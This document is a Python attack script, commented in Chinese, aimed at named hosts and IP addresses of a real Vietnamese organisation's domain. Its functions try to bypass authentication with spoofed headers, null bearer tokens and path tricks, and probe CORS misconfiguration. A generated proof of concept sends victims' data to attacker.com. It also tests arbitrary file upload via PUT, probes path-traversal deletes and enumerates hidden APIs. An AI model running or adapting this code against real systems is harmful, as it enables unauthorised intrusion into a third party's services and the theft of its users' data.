#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
高级漏洞利用扫描 - 寻找真实突破口
"""

import requests
import urllib3
import socket
import ssl
import base64
import json
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

print("""
╔══════════════════════════════════════════════════════════════════════════════╗
║                    高级漏洞利用扫描 - 真实突破口                             ║
╚══════════════════════════════════════════════════════════════════════════════╝
""")

# 重点目标
priority_targets = [
    {'host': 'admin.ems.com.vn', 'ip': '104.21.41.129', 'cors_vuln': True},
    {'host': 'mail-vn.ems.com.vn', 'ip': '222.255.250.247', 'http_methods': ['PUT', 'DELETE']},
    {'host': 'webapp.ems.com.vn', 'ip': '222.255.250.228'},
    {'host': 'api.ems.com.vn', 'ip': '115.146.121.131'},
    {'host': 'sso.ems.com.vn', 'ip': '104.21.41.129'}
]

def test_auth_bypass_advanced(target):
    """高级认证绕过测试"""
    bypasses = []
    base_url = f"https://{target['host']}" if 'cors_vuln' in target else f"http://{target['ip']}"
    
    # 测试路径
    auth_paths = [
        '/admin', '/api/admin', '/api/users', '/api/config',
        '/user/profile', '/account', '/dashboard', '/api/v1/me'
    ]
    
    # 高级绕过技术
    bypass_techniques = [
        # HTTP 头绕过
        {'headers': {'X-Originating-IP': '127.0.0.1'}},
        {'headers': {'X-Forwarded-For': '127.0.0.1'}},
        {'headers': {'X-Remote-IP': '127.0.0.1'}},
        {'headers': {'X-Client-IP': '127.0.0.1'}},
        {'headers': {'X-Real-IP': '127.0.0.1'}},
        
        # 认证头绕过
        {'headers': {'Authorization': 'Bearer null'}},
        {'headers': {'Authorization': 'Bearer undefined'}},
        {'headers': {'Authorization': 'Bearer {}'}},
        {'headers': {'Authorization': 'Bearer []'}},
        
        # HTTP 方法覆盖
        {'headers': {'X-HTTP-Method-Override': 'GET'}},
        {'headers': {'X-Method-Override': 'GET'}},
        
        # 路径规范化
        {'path_suffix': '/..;/'},
        {'path_suffix': '/.;/'},
        {'path_suffix': '//'},
        {'path_suffix': '/./'},
        
        # 参数污染
        {'params': {'admin': 'true'}},
        {'params': {'debug': '1'}},
        {'params': {'test': '1'}},
        
        # Referer 绕过
        {'headers': {'Referer': base_url + '/admin'}},
        {'headers': {'Referer': 'https://localhost/admin'}},
    ]
    
    for path in auth_paths:
        # 先获取正常响应
        normal_url = f"{base_url}{path}"
        try:
            normal_resp = requests.get(normal_url, verify=False, timeout=3, allow_redirects=False)
            normal_status = normal_resp.status_code
            normal_size = len(normal_resp.text)
            
            # 如果已经是 200，检查是否真的无需认证
            if normal_status == 200:
                if 'login' not in normal_resp.text.lower() and 'sign' not in normal_resp.text.lower():
                    content = normal_resp.text.lower()
                    if any(kw in content for kw in ['dashboard', 'admin', 'profile', 'settings']):
                        try:
                            # 尝试解析 JSON
                            data = normal_resp.json()
                            if data and not isinstance(data, str):
                                bypasses.append({
                                    'url': normal_url,
                                    'type': '默认无认证',
                                    'data': str(data)[:100]
                                })
                        except:
                            if len(normal_resp.text) > 100:
                                bypasses.append({
                                    'url': normal_url,
                                    'type': '默认无认证',
                                    'content': normal_resp.text[:100]
                                })
        except:
            continue
        
        # 测试绕过技术
        for technique in bypass_techniques:
            try:
                test_url = normal_url
                
                # 路径操作
                if 'path_suffix' in technique:
                    test_url = f"{base_url}{path}{technique['path_suffix']}"
                
                # 构建请求
                kwargs = {
                    'verify': False,
                    'timeout': 3,
                    'allow_redirects': False
                }
                
                if 'headers' in technique:
                    kwargs['headers'] = technique['headers']
                if 'params' in technique:
                    kwargs['params'] = technique['params']
                
                bypass_resp = requests.get(test_url, **kwargs)
                
                # 检测绕过成功
                if bypass_resp.status_code != normal_status:
                    if normal_status in [401, 403, 302] and bypass_resp.status_code == 200:
                        # 验证不是错误页面
                        if 'error' not in bypass_resp.text.lower() and 'not found' not in bypass_resp.text.lower():
                            bypasses.append({
                                'url': test_url,
                                'technique': technique,
                                'normal_status': normal_status,
                                'bypass_status': bypass_resp.status_code,
                                'type': '认证绕过'
                            })
                
            except:
                pass
    
    return bypasses

def exploit_cors_advanced(target):
    """高级 CORS 利用"""
    print(f"\n[*] 高级 CORS 利用: {target['host']}")
    
    base_url = f"https://{target['host']}"
    
    # 寻找带认证的 API 端点
    api_endpoints = [
        '/api/user', '/api/me', '/api/profile', '/api/account',
        '/api/v1/user', '/api/v1/me', '/api/v1/profile',
        '/user/info', '/account/info', '/me'
    ]
    
    exploits = []
    
    for endpoint in api_endpoints:
        url = f"{base_url}{endpoint}"
        
        # 测试不同的 Origin
        origins = [
            'https://evil.com',
            'http://localhost',
            'null',
            'https://attacker.com'
        ]
        
        for origin in origins:
            try:
                # 带凭据的请求
                headers = {
                    'Origin': origin,
                    'Cookie': 'test=test'  # 模拟已登录用户的 cookie
                }
                
                resp = requests.get(url, headers=headers, verify=False, timeout=3)
                
                acao = resp.headers.get('Access-Control-Allow-Origin', '')
                acac = resp.headers.get('Access-Control-Allow-Credentials', '')
                
                # 检查是否可利用
                if (acao == origin or acao == '*') and resp.status_code == 200:
                    # 检查是否返回敏感数据
                    try:
                        data = resp.json()
                        if data and isinstance(data, dict):
                            # 查找敏感字段
                            sensitive_keys = ['email', 'id', 'token', 'api_key', 'password', 'phone']
                            found_sensitive = any(key in str(data).lower() for key in sensitive_keys)
                            
                            if found_sensitive or len(str(data)) > 50:
                                exploits.append({
                                    'endpoint': endpoint,
                                    'origin': origin,
                                    'credentials': acac == 'true',
                                    'data_preview': str(data)[:100],
                                    'poc': generate_cors_poc(target['host'], endpoint, origin)
                                })
                    except:
                        if len(resp.text) > 100 and 'html' not in resp.headers.get('Content-Type', ''):
                            exploits.append({
                                'endpoint': endpoint,
                                'origin': origin,
                                'credentials': acac == 'true',
                                'content_type': resp.headers.get('Content-Type', '')
                            })
                
            except:
                pass
    
    return exploits

def generate_cors_poc(host, endpoint, origin):
    """生成 CORS PoC"""
    poc = f"""
// CORS Exploit PoC
fetch('https://{host}{endpoint}', {{
    credentials: 'include',
    headers: {{
        'Origin': '{origin}'
    }}
}})
.then(r => r.json())
.then(data => {{
    console.log('Stolen data:', data);
    // Send to attacker
    fetch('https://attacker.com/log', {{
        method: 'POST',
        body: JSON.stringify({{host: '{host}', data: data}})
    }});
}});
"""
    return poc

def exploit_put_delete(target):
    """利用 PUT/DELETE 方法"""
    print(f"\n[*] 利用 PUT/DELETE: {target['host']}")
    
    exploits = []
    base_url = f"http://{target['ip']}"
    
    if 'PUT' in target.get('http_methods', []):
        # 测试文件上传
        test_filename = f"test_{datetime.now().timestamp()}.txt"
        test_paths = [
            f'/{test_filename}',
            f'/upload/{test_filename}',
            f'/files/{test_filename}',
            f'/static/{test_filename}',
            f'/public/{test_filename}',
            f'/img/{test_filename}',
            f'/css/{test_filename}',
            f'/js/{test_filename}'
        ]
        
        test_content = f"Security test by red team - {datetime.now()}"
        
        for path in test_paths:
            url = f"{base_url}{path}"
            try:
                # 尝试 PUT 上传
                resp = requests.put(url, data=test_content, verify=False, timeout=3)
                
                if resp.status_code in [200, 201, 204]:
                    # 验证文件
                    check_resp = requests.get(url, verify=False, timeout=3)
                    
                    if check_resp.status_code == 200:
                        if test_content in check_resp.text or len(check_resp.text) == len(test_content):
                            exploits.append({
                                'type': 'Arbitrary File Upload',
                                'method': 'PUT',
                                'url': url,
                                'verified': True,
                                'severity': 'CRITICAL'
                            })
                            
                            # 清理测试文件
                            requests.delete(url, verify=False, timeout=3)
                            break
            except:
                pass
    
    if 'DELETE' in target.get('http_methods', []):
        # 测试目录遍历删除
        dangerous_paths = [
            '/../test.txt',
            '/../../test.txt',
            '/%2e%2e/test.txt',
            '/%252e%252e/test.txt'
        ]
        
        for path in dangerous_paths:
            url = f"{base_url}{path}"
            try:
                # 只发送 OPTIONS 请求来测试，不真的删除
                resp = requests.options(url, verify=False, timeout=3)
                
                if resp.status_code == 200:
                    allow_header = resp.headers.get('Allow', '')
                    if 'DELETE' in allow_header:
                        exploits.append({
                            'type': 'Potential Path Traversal DELETE',
                            'method': 'DELETE',
                            'url': url,
                            'verified': False,
                            'severity': 'HIGH'
                        })
            except:
                pass
    
    return exploits

def find_hidden_apis(target):
    """发现隐藏的 API 端点"""
    base_url = f"http://{target['ip']}"
    found_apis = []
    
    # API 版本枚举
    api_versions = ['v1', 'v2', 'v3', '1.0', '2.0']
    api_prefixes = ['/api/', '/rest/', '/service/', '/services/']
    
    # 常见但敏感的端点
    sensitive_endpoints = [
        'internal', 'debug', 'test', 'dev', 'stage',
        'admin', 'superuser', 'root', 'system',
        'config', 'settings', 'env', 'environment',
        'backup', 'export', 'dump', 'download',
        'webhook', 'callback', 'notify',
        'metrics', 'stats', 'monitor', 'health/detailed'
    ]
    
    for prefix in api_prefixes:
        for version in api_versions:
            for endpoint in sensitive_endpoints:
                url = f"{base_url}{prefix}{version}/{endpoint}"
                
                try:
                    resp = requests.get(url, verify=False, timeout=2, allow_redirects=False)
                    
                    if resp.status_code in [200, 401, 403]:
                        # 检查是否是 API 响应
                        content_type = resp.headers.get('Content-Type', '')
                        
                        if 'json' in content_type:
                            found_apis.append({
                                'url': url,
                                'status': resp.status_code,
                                'authenticated': resp.status_code in [401, 403],
                                'type': 'Hidden API Endpoint'
                            })
                        elif resp.status_code == 200:
                            # 检查响应内容
                            if any(kw in resp.text.lower() for kw in ['api', 'version', 'endpoint']):
                                found_apis.append({
                                    'url': url,
                                    'status': resp.status_code,
                                    'type': 'Potential API Documentation'
                                })
                except:
                    pass
    
    return found_apis

# 主扫描逻辑
all_findings = []

for target in priority_targets:
    print(f"\n{'='*60}")
    print(f"[+] 扫描目标: {target['host']}")
    print(f"{'='*60}")
    
    # 1. 高级认证绕过
    print("\n[*] 测试高级认证绕过...")
    auth_bypasses = test_auth_bypass_advanced(target)
    if auth_bypasses:
        print(f"  [!] 发现 {len(auth_bypasses)} 个认证绕过!")
        for bypass in auth_bypasses:
            print(f"    - {bypass['url']} ({bypass['type']})")
            all_findings.append(bypass)
    
    # 2. CORS 高级利用
    if target.get('cors_vuln'):
        cors_exploits = exploit_cors_advanced(target)
        if cors_exploits:
            print(f"  [!] 发现 {len(cors_exploits)} 个 CORS 可利用端点!")
            for exploit in cors_exploits:
                print(f"    - {exploit['endpoint']} (Origin: {exploit['origin']})")
                all_findings.append(exploit)
    
    # 3. PUT/DELETE 利用
    if target.get('http_methods'):
        method_exploits = exploit_put_delete(target)
        if method_exploits:
            print(f"  [!] 发现 {len(method_exploits)} 个方法利用!")
            for exploit in method_exploits:
                print(f"    - {exploit['type']} via {exploit['method']}")
                all_findings.append(exploit)
    
    # 4. 隐藏 API 发现
    print("\n[*] 寻找隐藏 API...")
    hidden_apis = find_hidden_apis(target)
    if hidden_apis:
        print(f"  [!] 发现 {len(hidden_apis)} 个隐藏端点!")
        for api in hidden_apis:
            print(f"    - {api['url']} ({api['status']})")
            all_findings.append(api)

# 生成报告
print(f"\n\n{'='*60}")
print("[+] 高级扫描总结")
print(f"{'='*60}")

if all_findings:
    print(f"\n发现 {len(all_findings)} 个潜在突破点\n")
    
    # 分类统计
    critical = [f for f in all_findings if f.get('severity') == 'CRITICAL']
    high = [f for f in all_findings if f.get('severity') == 'HIGH' or f.get('type') == '认证绕过']
    
    if critical:
        print(f"[严重] {len(critical)} 个:")
        for finding in critical:
            print(f"  - {finding.get('type', 'Unknown')}: {finding.get('url', '')}")
    
    if high:
        print(f"\n[高危] {len(high)} 个:")
        for finding in high[:5]:  # 只显示前5个
            print(f"  - {finding.get('type', 'Unknown')}: {finding.get('url', '')}")
    
    # 保存详细报告
    report_file = f"advanced_exploit_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(report_file, 'w', encoding='utf-8') as f:
        json.dump({
            'scan_time': datetime.now().isoformat(),
            'findings': all_findings,
            'summary': {
                'total': len(all_findings),
                'critical': len(critical),
                'high': len(high)
            }
        }, f, ensure_ascii=False, indent=2)
    
    print(f"\n[+] 详细报告已保存: {report_file}")
else:
    print("\n[-] 未发现新的突破点")

print("\n[+] 高级扫描完成!")